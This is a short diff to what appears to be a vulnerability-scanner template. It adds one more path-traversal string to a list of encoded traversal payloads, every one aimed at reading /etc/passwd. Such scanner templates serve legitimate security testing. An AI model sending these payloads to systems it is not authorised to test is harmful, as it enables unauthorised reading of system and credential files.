@@ -23,6 +23,7 @@ requests:
       - "..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd"
       - "..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd"
       - "./../../../../../../../../../../etc/passwd"
+      - "//....//....//....//....//....//....//....//....//....//etc/passwd"
       - "%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2eetc/passwd"
       - "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd"
       - ".%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/passwd"
